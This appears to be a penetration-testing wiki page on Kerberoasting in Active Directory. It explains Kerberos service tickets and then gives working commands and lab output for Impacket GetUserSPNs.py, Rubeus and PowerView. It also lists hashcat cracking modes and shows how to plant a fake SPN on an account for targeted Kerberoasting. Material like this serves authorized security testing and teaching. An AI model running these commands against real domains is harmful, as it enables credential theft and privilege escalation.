---
title: "Kerberoasting"
description: The classic AD privilege escalation technique to crack the passwords of service accounts offline
categories: [Active Directory, Lateral Movement]
tags: [Active Directory, Kerberoast, Lateral Movement, Privilege Escalation, Kerberoasting]
weight: 2
---

Kerberoasting is a privilege escalation technique for Active Directory credited to security researcher Tim Medin, who presented the attack back in 2014. The attack targets domain accounts with **Service Principal Names (SPN)**, which are unique identifiers that Kerberos uses to map a service to a domain service account in whose context the service is running.

## Theory
After authenticating, the user obtains a Ticket Granting Ticket (TGT) from the Kerberos KDC (Key Distribution Center). The user can then use the TGT to obtain a **service ticket** from the Ticket Granting Service (TGS) at the KDC. The service ticket is issued for a particular service principal and encrypted with the associated account's long-term key (the NT hash for RC4, or a password-derived AES key). Users can then present the service ticket to authenticate to the service; authorization is checked separately.

From an attacker's perspective, if we can obtain a valid TGT for a domain user, we can request service tickets for registered SPNs, subject to KDC policy. We can then extract the encrypted ticket data and test password guesses offline. A successful guess reveals the service account's password.

The usual workflow below requires domain credentials or a valid TGT and at least one account with an SPN other than the built-in `krbtgt` account used for TGTs. No administrative privileges are required. The success of password recovery depends on the strength of the service account's password.

## Attack from Linux
The `GetUserSPNs.py` script from Impacket can enumerate service accounts and Kerberoast them. We can run the script with the domain name, username, password, and optionally the domain controller IP address specified using `-dc-ip`.
```bash
GetUserSPNs.py -dc-ip 10.10.0.3 <domain>/<user>:<password>
```
This gives us a list of domain service accounts alongside their SPNs.
```shell-session
╭─brian@rx-93-nu ~
╰─$ GetUserSPNs.py -dc-ip 10.10.0.3 gundam.local/amuro.ray:Password1
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName                        Name     MemberOf                                                              PasswordLastSet             LastLogon                   Delegation
------------------------------------------  -------  --------------------------------------------------------------------  --------------------------  --------------------------  ----------
MSSQLSvc/RA-CAILUM.GUNDAM.local:1433        svc_sql  CN=Group Policy Creator Owners,OU=Security Groups,DC=GUNDAM,DC=local  2025-06-06 00:13:47.605590  2026-04-07 16:16:56.632421

MSSQLSvc/RA-CAILUM.GUNDAM.local:SQLEXPRESS  svc_sql  CN=Group Policy Creator Owners,OU=Security Groups,DC=GUNDAM,DC=local  2025-06-06 00:13:47.605590  2026-04-07 16:16:56.632421
```
We use the `-request` option to request service tickets and extract the encrypted portions.
```bash
GetUserSPNs.py -request -dc-ip 10.10.0.3 <domain>/<user>:<password>
```
Optionally, we may request a service ticket for a specific account using `-request-user`.
```bash
GetUserSPNs.py -request -request-user <target_user> -dc-ip 10.10.0.3 <domain>/<user>:<password>
```

With `-request`, `GetUserSPNs.py` automatically requests tickets for the service accounts and extracts the encrypted portions in JtR/hashcat format that can be copied for offline cracking. We can also use `-outputfile` to specify a filename for the extracted data.
```txt
╭─brian@rx-93-nu ~
╰─$ GetUserSPNs.py -dc-ip 10.10.0.3 gundam.local/amuro.ray:Password1 -request
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName                        Name     MemberOf                                                              PasswordLastSet             LastLogon                   Delegation
------------------------------------------  -------  --------------------------------------------------------------------  --------------------------  --------------------------  ----------
MSSQLSvc/RA-CAILUM.GUNDAM.local:1433        svc_sql  CN=Group Policy Creator Owners,OU=Security Groups,DC=GUNDAM,DC=local  2025-06-06 00:13:47.605590  2026-04-07 16:16:56.632421

MSSQLSvc/RA-CAILUM.GUNDAM.local:SQLEXPRESS  svc_sql  CN=Group Policy Creator Owners,OU=Security Groups,DC=GUNDAM,DC=local  2025-06-06 00:13:47.605590  2026-04-07 16:16:56.632421




[-] CCache file is not found. Skipping...
$krb5tgs$23$*svc_sql$GUNDAM.LOCAL$gundam.local/svc_sql*$[...]
```


## Attack from Windows
Kerberoasting can also be done if we can log in to a machine joined to the target domain as a domain user. Kerberoasting from the Windows perspective is drastically simplified with the use of tools, but be aware of anti-virus and detection if those are in play during an engagement.

### Using Rubeus
Rubeus is a multi-purpose tool written in C# that focuses on Kerberos interaction. To use Rubeus for kerberoasting, we run Rubeus with `kerberoast` subcommand. The `/nowrap` option allows us to easily copy the service ticket to a file for cracking.
```shell-session
PS C:\research> .\Rubeus.exe kerberoast /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.6.4


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Searching the current domain for Kerberoastable users

[*] Total kerberoastable users : 1


[*] SamAccountName         : svc_sql
[*] DistinguishedName      : CN=SQL Service,CN=Users,DC=GUNDAM,DC=local
[*] ServicePrincipalName   : MSSQLSvc/RA-CAILUM.GUNDAM.local:1433
[*] PwdLastSet             : 6/6/2025 5:13:47 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*svc_sql$GUNDAM.local$MSSQLSvc/RA-CAILUM.GUNDAM.local:1433*$[...]
```

Rubeus also supports the `/ldapfilter` option to target specific accounts. For example, `admincount=1` selects accounts marked for administrative protection (including stale markers), while `samaccountname=svc_sql` selects a specific user.
```txt
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```
```txt
.\Rubeus.exe kerberoast /ldapfilter:'samaccountname=svc_sql' /nowrap
```

### Using PowerView
Beyond being a powerful Swiss Army Knife for AD enumeration, PowerView can also be used for Kerberoasting.

We can first enumerate domain accounts with SPN using `Get-DomainUser * -spn`:
```shell-session
PS C:\research> Get-DomainUser * -spn | select samaccountname

samaccountname
--------------
krbtgt
svc_sql
```

Next, we target a specific SPN account to obtain a service ticket for it.
```shell-session
PS C:\research> Get-DomainUser -Identity svc_sql | Get-DomainSPNTicket -Format Hashcat


SamAccountName       : svc_sql
DistinguishedName    : CN=SQL Service,CN=Users,DC=GUNDAM,DC=local
ServicePrincipalName : MSSQLSvc/RA-CAILUM.GUNDAM.local:1433
TicketByteHexStream  :
Hash                 : $krb5tgs$23$*svc_sql$GUNDAM.local$MSSQLSvc/RA-CAILUM.GUNDAM.local:1433*$[...]
```

## Cracking Service Ticket
With the service ticket obtained, hashcat can be used to test password guesses for the target account. Check the encryption algorithm indicated by the extracted data's prefix rather than assuming RC4; tool options, account settings, and KDC policy affect the result. For `$krb5tgs$23$*` (RC4, type 23), use mode **13100**.
```bash
hashcat -m 13100 -O <service_ticket_file> <wordlist>
```
We may instead receive data starting with `$krb5tgs$17$` (type 17) or `$krb5tgs$18$` (type 18), indicating AES-128 and AES-256 encryption, respectively. Testing password guesses against AES service tickets is typically more time-consuming than against RC4 tickets, but not impossible.

If you wish to proceed, hashcat mode **19600** can be used to crack type 17 TGS-REP, and mode **19700** to crack type 18 TGS-REP.
```bash
hashcat -m 19600 -O <service_ticket_file> <wordlist>
```
```bash
hashcat -m 19700 -O <service_ticket_file> <wordlist>
```

## Targeted Kerberoasting
Targeted Kerberoasting abuses ACLs over a user object. If the principal we control has effective `GenericWrite` or `GenericAll` access over a target user, or explicit `WriteProperty` permission on the target user's `servicePrincipalName`, we may add a unique SPN and request a service ticket for offline password guessing.

We can use PowerView function `Set-DomainObject` for this purpose.
```powershell
Set-DomainObject -Credential <cred_object> -Identity <target_user> -SET @{serviceprincipalname='notahacker/LEGIT'}
```

Alternatively, `bloodyAD` may be used from the Linux perspective.
```bash
bloodyAD -d <domain> --host <dc_fqdn> -u <user> -p <password> set object <target_user> servicePrincipalName -v 'fake/SPN'
```

From there, we may Kerberoast the target user as if it were a normal service account. Preserve any existing SPNs and restore the original attribute values after the authorized test; `-SET` replaces the attribute's values.

## References and Further Reading
- [Tim Medin's 2014 Derbycon Presentation on Kerberoasting](https://youtu.be/PUyhlN-E5MU?si=SUUTv9gF5XeDQ2qy)
- [Hashcat Example Hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)

